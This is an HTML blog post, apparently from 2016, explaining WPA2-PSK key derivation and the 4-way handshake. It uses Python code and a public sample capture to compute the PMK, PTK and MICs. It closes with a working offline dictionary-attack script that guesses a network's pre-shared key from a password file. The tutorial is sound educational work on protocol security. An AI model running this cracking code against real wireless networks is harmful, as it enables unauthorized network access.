@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>nicholastsmith</title>
+    <meta name="author" content="">
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="../style.css">
+    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+    <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+
+</head>
+
+<body>
+    <div class="HeadImg">
+        <div class="Header">
+            <div style="display: table; height: 100%; width: 100%;">
+                <div style="display: table-row; height: 100%; width: 100%;">
+                    <div style="display: table-cell; height: 100%; padding: 0 0 0 0.5%; text-align: left; vertical-align: bottom; width: 70%;">
+                        <a href="../index.html" style="text-decoration: none;"><text class="FontHeader"><b>nicholastsmith</b>.</text></a>
+                    </div>
+                    <div style="display: table-cell; height: 100%; padding: 0 0.5% 0 0; text-align: center; vertical-align: bottom; width: 15%;">
+                        <a class="FontNavi" href="About.html">About</a>
+                    </div>
+                    <div style="display: table-cell; height: 100%; padding: 0 0.5% 0 0; text-align: center; vertical-align: bottom; width: 15%;">
+                        <a class="FontNavi" href="../index.html">Blog</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <br/><br/><br/>
+        <text class="FontLogo"><b>The Website and Blog</b></text><br/>
+        <text class="FontLogo">of</text><br/>
+        <text class="FontLogo"><b>Nicholas T. Smith</b></text><br/>
+        <text class="FontLogo"><i>The machine learns and I from the machine.</i></text>
+        <br/><br/><br/><br/><br/><br/><br/><br/>
+    </div>
+    <div id="Cont" class="Contents">
+        <div class="CTable">
+            <div style="display: table-row; height: 100%; width: 100%;">
+                <div class="BarLeft" id="LBar"></div>
+                <div class="BarCenter" id="CBar"><br/><h1>WPA2 Key Derivation with Anaconda Python</h1><h2>Wed, 16 Nov 2016</h2><h3><i>Anaconda</i>, <i>Computer Science</i>, <i>Cryptography</i>, <i>Networking</i>, <i>Python</i>, <i>Security</i>, <i>Wireless Networks</i>, <i>Wpa2</i></h3>This post is regarding the WPA2 4-way handshake that is used for authentication and the establishment of encryption keys for secure wireless communication. A practical implementation of the key derivation process is provided in python. The sample packet capture containing the 4-way handshake that is used in this post is <a href="https://github.com/aircrack-ng/aircrack-ng/blob/master/test/wpa2.eapol.cap">available here</a>. The complete source code discussed in this post is <a href="https://github.com/nicholastoddsmith/PyCrack/blob/master/pywd.py">on Github</a>. The software <a href="https://www.wireshark.org/">Wireshark</a> is used to analyze the provided packet trace.
+<h1>The First Packet</h1>
+The first packet in the above trace is a <i>beacon frame</i> broadcast from the access point. Access points periodically transmit beacon frames to announce their presence to nearby devices. As seen in Figure 1 below, the destination address for the beacon frame is the broadcast address: FF:FF:FF:FF:FF:FF.<br/>
+<p style="text-align:center;">
+<img src="../Img/beaconmac.png" height="auto" width="75%" />
+</p>
+<p style="text-align:center;">
+<b>Figure 1: Beacon Frame Destination MAC</b>
+</p>
+<br/>
+The beacon frame also contains the <i>SSID</i> field, which will be necessary in later steps. The SSID is the name of network. As can be seen in Figure 2 below, the SSID for the access point found in this packet capture is <i>Harkonen</i>.<br/>
+<p style="text-align:center;">
+<img src="../Img/beaconssid.png" height="auto" width="75%" />
+</p>
+<p style="text-align:center;">
+<b>Figure 2: Beacon Frame SSID</b>
+</p>
+<br/>
+The next four packets of the capture comprise what is known as the WPA2 <i>4-way handshake</i>. This handshake is used to establish both the authenticity of the two endpoints and the encryption keys.<br/>
+<p style="text-align:center;">
+<img src="../Img/4wayhs1.png" height="auto" width="75%" />
+</p>
+<p style="text-align:center;">
+<b>Figure 3: 4-Way Handshake Sequence Diagram</b>
+</p>
+<br/>
+Figure 3 above shows a basic sequence diagram for the steps of the 4-way handshake. The following sections cover each step in detail.
+<h1>The 4-Way Handshake: Part 1</h1>
+In the first packet of the handshake, the access point sends a message to the station. A key part of this first step of the handshake is the 256-bit WPA Key Nonce (number used once) field, also known as the <i>ANonce</i>. The ANonce is a randomly generated number that will be used to establish the pairwise transient key (PTK). The PTK is used to encrypt later communciation between the access point and the station.<br/>
+<p style="text-align:center;">
+<img src="../Img/anonce.png" height="auto" width="75%" />
+</p>
+<p style="text-align:center;">
+<b>Figure 4: ANonce Field</b>
+</p>
+<br/>
+Figure 4 above shows a capture with the WPA Key Nonce field of the first message highlighted.
+<h1>The 4-Way Handshake: Part 2</h1>
+After the station receives the first message, it generates its own nonce, referred to as the SNonce. The station, assuming it knows the PMK, then has enough information to generate the PTK. The PTK is computed as follows:
+<br/>
+<br/>
+<hr/><br/><pre style="margin: auto; border: 1px solid #B0B0B0B0; padding: 0.75%;max-width: 42vw; overflow-x: auto;"><code>#Used for computing HMAC
+import hmac
+#Used to convert from hex to binary
+from binascii import a2b_hex, b2a_hex
+#Used for computing PMK
+from hashlib import pbkdf2_hmac, sha1, md5
+
+#Pseudo-random function for generation of
+#the pairwise transient key (PTK)
+#key:       The PMK
+#A:         b'Pairwise key expansion'
+#B:         The apMac, cliMac, aNonce, and sNonce concatenated
+#           like mac1 mac2 nonce1 nonce2
+#           such that mac1 &lt; mac2 and nonce1 &lt; nonce2
+#return:    The ptk
+def PRF(key, A, B):
+    #Number of bytes in the PTK
+    nByte = 64
+    i = 0
+    R = b''
+    #Each iteration produces 160-bit value and 512 bits are required
+    while(i &lt;= ((nByte * 8 + 159) / 160)):
+        hmacsha1 = hmac.new(key, A + chr(0x00).encode() + B + chr(i).encode(), sha1)
+        R = R + hmacsha1.digest()
+        i += 1
+    return R[0:nByte]
+
+#Make parameters for the generation of the PTK
+#aNonce:        The aNonce from the 4-way handshake
+#sNonce:        The sNonce from the 4-way handshake
+#apMac:         The MAC address of the access point
+#cliMac:        The MAC address of the client
+#return:        (A, B) where A and B are parameters
+#               for the generation of the PTK
+def MakeAB(aNonce, sNonce, apMac, cliMac):
+    A = b&quot;Pairwise key expansion&quot;
+    B = min(apMac, cliMac) + max(apMac, cliMac) + min(aNonce, sNonce) + max(aNonce, sNonce)
+    return (A, B)
+
+#Compute the 1st message integrity check for a WPA 4-way handshake
+#pwd:       The password to test
+#ssid:      The ssid of the AP
+#A:         b'Pairwise key expansion'
+#B:         The apMac, cliMac, aNonce, and sNonce concatenated
+#           like mac1 mac2 nonce1 nonce2
+#           such that mac1 &lt; mac2 and nonce1 &lt; nonce2
+#data:      A list of 802.1x frames with the MIC field zeroed
+#return:    (x, y, z) where x is the mic, y is the PTK, and z is the PMK
+def MakeMIC(pwd, ssid, A, B, data, wpa = False):
+    #Create the pairwise master key using 4096 iterations of hmac-sha1
+	#to generate a 32 byte value
+    pmk = pbkdf2_hmac('sha1', pwd.encode('ascii'), ssid.encode('ascii'), 4096, 32)
+    #Make the pairwise transient key (PTK)
+    ptk = PRF(pmk, A, B)
+    #WPA uses md5 to compute the MIC while WPA2 uses sha1
+    hmacFunc = md5 if wpa else sha1
+    #Create the MICs using HMAC-SHA1 of data and return all computed values
+    mics = [hmac.new(ptk[0:16], i, hmacFunc).digest() for i in data]
+    return (mics, ptk, pmk)</code></pre><br/><hr/><br/>
+<br/>
+<br/><b>Note:</b> The above code assumes that the PMK is computed based on a <i>pre-shared key</i> (PSK). This is known as WPA2-PSK and is common for home Wi-Fi networks. In WPA2-PSK, the PMK is computed using PBKDF2 and HMAC-SHA1 as seen in the above code.
+<br/>
+<br/>In the second message, the station responds to the access point. Two key components of the second message are the 256-bit SNonce that was computed earlier and the 128-bit message integrity check (MIC). The SNonce is the last piece of information the access point needs to compute the PTK. The MIC verifies both that the station knows the PTK, and thus also the PMK. The SNonce field is highlighted below in Figure 5.<br/>
+<p style="text-align:center;">
+<img src="../Img/snonce.png" height="auto" width="75%" />
+</p>
+<p style="text-align:center;">
+<b>Figure 5: SNonce Field</b>
+</p>
+<br/>
+The ANonce and SNonce are randomly generated numbers to prevent <i>replay attacks</i>: an attack in which an attacker attempts to authenticate using a previously captured packet. From above it can be seen that the PTK depends upon the ANonce and SNonce, and thus it differs from connection to connection; a technique which thwarts replay attacks.
+<br/>
+<br/>Notice, however, that up to this point authentication has not yet been performed; neither side has verified if the other actually knows the PMK. This is the task of the WPA Key MIC field, seen below in Figure 6.<br/>
+<p style="text-align:center;">
+<img src="../Img/mic1.png" height="auto" width="75%" />
+</p>
+<p style="text-align:center;">
+<b>Figure 6: WPA Key MIC 1</b>
+</p>
+<br/>
+The WPA Key MIC field is computed by taking all of the 802.1x fields and computing an HMAC of them. When the computation is performed, the MIC field itself is set to all zeros. <b>Note:</b> For WPA the Pseudo-Random Function (PRF) that is used is <b>MD5</b> while for WPA2 the <b>SHA1</b> algorithm is used. Figure 7 below shows the data to be used highlighted in Wireshark. Since MD5 produces a 128-bit value and SHA1 produces a 160-bit value, only the first 128-bits are preserved of the digest. This can be accomplished by discarding the last 8 hex values.<br/>
+<p style="text-align:center;">
+<img src="../Img/data1.png" height="auto" width="75%" />
+</p>
+<p style="text-align:center;">
+<b>Figure 7: Data Section of WPA2 EAPOL Packet 2</b>
+</p>
+<br/>
+As can be seen from above, the MIC can only be computed if the PTK, and thus the PMK, is known. By defining the MIC in this way, each side can verify the other knows the PMK without ever transmitting the PMK. A 3rd party that is witness to the 4-way handshake still cannot determine the PMK or PTK.
+<h1>The 4-Way Handshake: Part 2</h1>
+The third packet of the 4-way handshake is similar in spirit to that of the second. Notice in Figure 8 below that it also contains a WPA Key MIC and WPA Key Data field. The MIC field will serve to authenticate the access point to the station. Upon verification of the MIC, the station knows that the access point is in possession of the PTK and thus the PMK. It is assumed that only the genuine access point knows the PMK and thus the authenticity of the access point is confirmed. The method for computing the second MIC is the same as the first.<br/>
+<p style="text-align:center;">
+<img src="../Img/mic2.png" height="auto" width="75%" />
+</p>
+<p style="text-align:center;">
+<b>Figure 8: WPA Key MIC 2</b>
+</p>
+<br/>
+The third packet of the 4-way handshake also contains the group temporal key (GTK) which is used to encrypt and decrypt all broadcast data transmissions between the access point and its clients. The GTK is encrypted inside the WPA Key Data field of the third packet.
+<h1>The 4-Way Handshake: Part 4:</h1>
+The final packet of the 4-Way Handshake is an acknowledgement to the access point that the station has received the appropriate keys and encrypted communication will begin. The forth packet also contains a MIC field which is computed in the same way as the previous MICs.
+<h1>WPA2 Key Derivation in Python</h1>
+Using the above python code, the PTK, PMK, and MICs are computed for the given packet capture. The following python code initializes variables containing the fields extracted from the packet capture. Then the MICS, PTK, and PMK are computed. Finally the PTK and PMK are displayed and the computed MICs are compared to the actual MICs.
+<br/>
+<br/>
+<hr/><br/><pre style="margin: auto; border: 1px solid #B0B0B0B0; padding: 0.75%;max-width: 42vw; overflow-x: auto;"><code>#Run a brief test showing the computation of the PTK, PMK, and MICS
+#for a 4-way handshake
+def RunTest():
+    #the pre-shared key (PSK)
+    psk = &quot;12345678&quot;
+    #ssid name
+    ssid = &quot;Harkonen&quot;
+    #ANonce
+    aNonce = a2b_hex('225854b0444de3af06d1492b852984f04cf6274c0e3218b8681756864db7a055')
+    #SNonce
+    sNonce = a2b_hex(&quot;59168bc3a5df18d71efb6423f340088dab9e1ba2bbc58659e07b3764b0de8570&quot;)
+    #Authenticator MAC (AP)
+    apMac = a2b_hex(&quot;00146c7e4080&quot;)
+    #Station address: MAC of client
+    cliMac = a2b_hex(&quot;001346fe320c&quot;)
+    #The first MIC
+    mic1 = &quot;d5355382b8a9b806dcaf99cdaf564eb6&quot;
+    #The entire 802.1x frame of the second handshake message with the MIC field set to all zeros
+    data1 = a2b_hex(&quot;0103007502010a0010000000000000000159168bc3a5df18d71efb6423f340088dab9e1ba2bbc58659e07b3764b0de8570000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac040100000fac040100000fac020100&quot;)
+    #The second MIC
+    mic2 = &quot;1e228672d2dee930714f688c5746028d&quot;
+    #The entire 802.1x frame of the third handshake message with the MIC field set to all zeros
+    data2 = a2b_hex(&quot;010300970213ca00100000000000000002225854b0444de3af06d1492b852984f04cf6274c0e3218b8681756864db7a055192eeef7fd968ec80aee3dfb875e8222370000000000000000000000000000000000000000000000000000000000000000383ca9185462eca4ab7ff51cd3a3e6179a8391f5ad824c9e09763794c680902ad3bf0703452fbb7c1f5f1ee9f5bbd388ae559e78d27e6b121f&quot;)
+    #The third MIC
+    mic3 = &quot;9dc81ca6c4c729648de7f00b436335c8&quot;
+    #The entire 802.1x frame of the forth handshake message with the MIC field set to all zeros
+    data3 = a2b_hex(&quot;0103005f02030a0010000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;)
+    #Create parameters for the creation of the PTK, PMK, and MICs
+    A, B = MakeAB(aNonce, sNonce, apMac, cliMac)
+    #Generate the MICs, the PTK, and the PMK
+    mics, ptk, pmk = MakeMIC(psk, ssid, A, B, [data1, data2, data3])
+    #Display the pairwise master key (PMK)
+    pmkStr = b2a_hex(pmk).decode().upper()
+    print(&quot;pmk:\t\t&quot; + pmkStr + '\n')
+    #Display the pairwise transient key (PTK)
+    ptkStr = b2a_hex(ptk).decode().upper()
+    print(&quot;ptk:\t\t&quot; + ptkStr + '\n')
+    #Display the desired MIC1 and compare to target MIC1
+    mic1Str = mic1.upper()
+    print(&quot;desired mic:\t&quot; + mic1Str)
+    #Take the first 128-bits of the 160-bit SHA1 hash
+    micStr = b2a_hex(mics[0]).decode().upper()[:-8]
+    print(&quot;actual mic:\t&quot; + micStr)
+    print('MATCH\n' if micStr == mic1Str else 'MISMATCH\n')
+    #Display the desired MIC2 and compare to target MIC2
+    mic2Str = mic2.upper()
+    print(&quot;desired mic:\t&quot; + mic2Str)
+    #Take the first 128-bits of the 160-bit SHA1 hash
+    micStr = b2a_hex(mics[1]).decode().upper()[:-8]
+    print(&quot;actual mic:\t&quot; + micStr)
+    print('MATCH\n' if micStr == mic2Str else 'MISMATCH\n')
+    #Display the desired MIC3 and compare to target MIC3
+    mic3Str = mic3.upper()
+    print(&quot;desired mic:\t&quot; + mic3Str)
+    #Take the first 128-bits of the 160-bit SHA1 hash
+    micStr = b2a_hex(mics[2]).decode().upper()[:-8]
+    print(&quot;actual mic:\t&quot; + micStr)
+    print('MATCH\n' if micStr == mic3Str else 'MISMATCH\n')
+    return</code></pre><br/><hr/><br/>
+<br/>
+<br/>The output for the above code is shown in the following code block.
+<br/>
+<br/>
+<hr/><br/><pre style="margin: auto; border: 1px solid #B0B0B0B0; padding: 0.75%;max-width: 42vw; overflow-x: auto;"><code>pmk:			EE51883793A6F68E9615FE73C80A3AA6F2DD0EA537BCE627B929183CC6E57925
+
+ptk:			EA0E404633C802450302868CCAA749DE5CBA5ABCB267E2DE1D5E21E57ACCD5079B31E9FF220E132AE4F6ED9EF1ACC88545825FC32EE55961395AE43734D6C107
+
+desired mic:	D5355382B8A9B806DCAF99CDAF564EB6
+actual mic:		D5355382B8A9B806DCAF99CDAF564EB6
+MATCH
+
+desired mic:	1E228672D2DEE930714F688C5746028D
+actual mic:		1E228672D2DEE930714F688C5746028D
+MATCH
+
+desired mic:	9DC81CA6C4C729648DE7F00B436335C8
+actual mic:		9DC81CA6C4C729648DE7F00B436335C8
+MATCH</code></pre><br/><hr/><br/>
+<br/>
+<br/>Notice that since the MICs match, the provided PSK is correct. If the PSK is instead changed to "abcdefgh", notice that the MICs no longer match.
+<br/>
+<br/>
+<hr/><br/><pre style="margin: auto; border: 1px solid #B0B0B0B0; padding: 0.75%;max-width: 42vw; overflow-x: auto;"><code>pmk:			EBB5D703F8834A08D61A67A982FA009E08F747DD65D82C240169E604218B3ACF
+
+ptk:			63E412CE67759BD5CEBD0F5B5A487CA155ADD51D771293E31C05BF05A3A98BCFE645F29203956E34C6A5B0CC2186B1161F643807349576CDB2FB1C158B03648F
+
+desired mic:	D5355382B8A9B806DCAF99CDAF564EB6
+actual mic:		C2EE0E125962261C897A05E33B579F5C
+MISMATCH
+
+desired mic:	1E228672D2DEE930714F688C5746028D
+actual mic:		6D60808DE292A32BAE1D381B3D295B2F
+MISMATCH
+
+desired mic:	9DC81CA6C4C729648DE7F00B436335C8
+actual mic:		D5F07A0FBC8F376541D46591FDA74470
+MISMATCH</code></pre><br/><hr/><br/>
+<br/>
+<br/>In this way, the PSK can be guessed and the corresponding MICs created until a match is found. This type of attack is known as an offline <i>dictionary attack</i>. The following python code will read a file passwd.txt containing one PSK per line and will test each one until the list is exhausted or until a password is found.
+<br/>
+<br/>
+<hr/><br/><pre style="margin: auto; border: 1px solid #B0B0B0B0; padding: 0.75%;max-width: 42vw; overflow-x: auto;"><code>#Tests a list of passwords; if the correct one is found it
+#prints it to the screen and returns it
+#S:         A list of passwords to test
+#ssid:      The ssid of the AP
+#aNonce:    The ANonce as a byte array
+#sNonce:    The SNonce as a byte array
+#apMac:     The AP's MAC address
+#cliMac:    The MAC address of the client (aka station)
+#data:      The 802.1x frame of the second message with the MIC field zeroed
+#data2:     The 802.1x frame of the third message with the MIC field zeroed
+#data3:     The 802.1x frame of the forth message with the MIC field zeroed
+#targMic:   The MIC for message 2
+#targMic2:  The MIC for message 3
+#targMic3:  The MIC for message 4
+def TestPwds(S, ssid, aNonce, sNonce, apMac, cliMac, data, data2, data3, targMic, targMic2, targMic3):
+    #Pre-computed values
+    A, B = MakeAB(aNonce, sNonce, apMac, cliMac)
+    #Loop over each password and test each one
+    for i in S:
+        mic, _, _ = MakeMIC(i, ssid, A, B, [data])
+        v = b2a_hex(mic[0]).decode()[:-8]
+        #First MIC doesn't match
+        if(v != targMic):
+            continue
+        #First MIC matched... Try second
+        mic2, _, _ = MakeMIC(i, ssid, A, B, [data2])
+        v2 = b2a_hex(mic2[0]).decode()[:-8]
+        if(v2 != targMic2):
+            continue
+        #First 2 match... Try last
+        mic3, _, _ = MakeMIC(i, ssid, A, B, [data3])
+        v3 = b2a_hex(mic3[0]).decode()[:-8]
+        if(v3 != targMic3):
+            continue
+        #All of them match
+        print('!!!Password Found!!!')
+        print('Desired MIC1:\t\t' + targMic)
+        print('Computed MIC1:\t\t' + v)
+        print('\nDesired MIC2:\t\t' + targMic2)
+        print('Computed MIC2:\t\t' + v2)
+        print('\nDesired MIC2:\t\t' + targMic3)
+        print('Computed MIC2:\t\t' + v3)
+        print('Password:\t\t' + i)
+        return i
+    return None
+
+if __name__ == &quot;__main__&quot;:
+    
+    RunTest()
+    #Read a file of passwords containing
+    #passwords separated by a newline
+    with open('passwd.txt') as f:
+        S = []
+        for l in f:
+            S.append(l.strip())
+    #ssid name
+    ssid = &quot;Harkonen&quot;
+    #ANonce
+    aNonce = a2b_hex('225854b0444de3af06d1492b852984f04cf6274c0e3218b8681756864db7a055')
+    #SNonce
+    sNonce = a2b_hex(&quot;59168bc3a5df18d71efb6423f340088dab9e1ba2bbc58659e07b3764b0de8570&quot;)
+    #Authenticator MAC (AP)
+    apMac = a2b_hex(&quot;00146c7e4080&quot;)
+    #Station address: MAC of client
+    cliMac = a2b_hex(&quot;001346fe320c&quot;)
+    #The first MIC
+    mic1 = &quot;d5355382b8a9b806dcaf99cdaf564eb6&quot;
+    #The entire 802.1x frame of the second handshake message with the MIC field set to all zeros
+    data1 = a2b_hex(&quot;0103007502010a0010000000000000000159168bc3a5df18d71efb6423f340088dab9e1ba2bbc58659e07b3764b0de8570000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac040100000fac040100000fac020100&quot;)
+    #The second MIC
+    mic2 = &quot;1e228672d2dee930714f688c5746028d&quot;
+    #The entire 802.1x frame of the third handshake message with the MIC field set to all zeros
+    data2 = a2b_hex(&quot;010300970213ca00100000000000000002225854b0444de3af06d1492b852984f04cf6274c0e3218b8681756864db7a055192eeef7fd968ec80aee3dfb875e8222370000000000000000000000000000000000000000000000000000000000000000383ca9185462eca4ab7ff51cd3a3e6179a8391f5ad824c9e09763794c680902ad3bf0703452fbb7c1f5f1ee9f5bbd388ae559e78d27e6b121f&quot;)
+    #The third MIC
+    mic3 = &quot;9dc81ca6c4c729648de7f00b436335c8&quot;
+    #The entire 802.1x frame of the forth handshake message with the MIC field set to all zeros
+    data3 = a2b_hex(&quot;0103005f02030a0010000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;)
+    #Run an offline dictionary attack against the access point
+    TestPwds(S, ssid, aNonce, sNonce, apMac, cliMac, data1, data2, data3, mic1, mic2, mic3)</code></pre><br/><hr/><br/>
+<br/>
+<br/><b>Note:</b> Please use the above code responsibly. There are many other tools available to perform such dictionary attacks. The above is provided <i>only</i> for educational purposes.<br/><br/></div>
+                <div class="BarRight" id="RBar"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="Footer">
+        <div style="display: table; width: 100%;">
+            <div style="display: table-row; height: 100%; width: 100%;">
+                <div style="display: table-cell; height: 100%; width: 30%;"></div>
+                <div style="display: table-cell; height: 100%; width: 20%; vertical-align: middle;">
+                    <a class="LinkFooter" href="index.html">Home</a><br/><br/>
+                </div>
+                <div style="display: table-cell; height: 100%; width: 20%; vertical-align: middle;">
+                    <text class="LinkFooter" onClick="window.scrollTo(0,0);">Top</text><br/><br/>
+                </div>
+                <div style="display: table-cell; height: 100%; width: 30%;"></div>
+            </div>
+        </div>
+        <br/>
+        <cite class="CiteText">2020 Nicholas T. Smith All Rights Reserved</cite>        
+    </div>
+</body>
+</html>
